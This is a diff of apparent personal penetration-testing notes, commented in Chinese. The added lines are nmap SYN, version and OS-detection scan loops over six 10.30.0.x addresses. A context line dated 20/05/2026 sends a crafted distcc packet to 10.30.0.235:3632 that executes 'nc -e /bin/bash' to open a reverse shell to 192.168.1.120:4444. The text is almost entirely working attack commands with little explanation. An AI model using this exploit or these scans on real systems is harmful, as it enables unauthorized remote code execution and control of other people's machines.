@@ -38,6 +38,19 @@ sudo nmap -Pn -p 2000-3000 -sS -sV -O -F --max-retries 1 -v -oN mid_port_scan.tx
 -sS -sV -O：继续保持我们大纲范围内的：SYN 隐蔽扫描、软件版本精准识别、操作系统特征强行刺探。
 
 
+for ip in 10.30.0.1 10.30.0.109 10.30.0.235 10.30.0.236 10.30.0.237 10.30.0.250; do sudo nmap -Pn -p 2000-3000 -sS -sV -O --max-retries 1 -v -oN "scan_${ip}_$(date +%Y%m%d_%H%M%S).txt" "$ip"; done
+
+for ip in 10.30.0.1 10.30.0.109 10.30.0.235 10.30.0.236 10.30.0.237 10.30.0.250; do sudo nmap -Pn -p 2000-3000 -sS -sV -O --max-retries 1 -v -oN "scan_${ip}_$(date +%Y%m%d_%H%M%S).txt" "$ip"; done
+
+ports="1001-2000"; for ip in 10.30.0.1 10.30.0.109 10.30.0.235 10.30.0.236 10.30.0.237 10.30.0.250; do sudo nmap -Pn -p "$ports" -sS -sV -O --max-retries 1 -v -oN "scan_${ip}_p${ports}_$(date +%Y%m%d_%H%M%S).txt" "$ip"; done
+
+ports="1-1000"; for ip in 10.30.0.1 10.30.0.109 10.30.0.235 10.30.0.236 10.30.0.237 10.30.0.250; do sudo nmap -Pn -p "$ports" -sS -sV -O --max-retries 1 -v -oN "scan_${ip}_p${ports}_$(date +%Y%m%d_%H%M%S).txt" "$ip"; done
+
+
+
+
+
+
 
 20/05/2026:
 printf "DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV00000031nc -e /bin/bash 192.168.1.120 4444ARGD00000001X" | nc -nv 10.30.0.235 3632
